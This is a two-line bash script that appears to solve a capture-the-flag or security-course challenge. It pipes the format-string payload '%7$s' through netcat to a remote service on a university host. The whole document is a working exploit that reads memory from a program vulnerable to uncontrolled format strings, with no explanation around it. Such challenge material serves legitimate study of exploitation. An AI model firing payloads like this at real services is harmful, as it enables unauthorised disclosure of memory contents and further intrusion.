#!/bin/bash

python3 -c "import sys; sys.stdout.buffer.write(b'%7\$s' + b'\n')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 22191
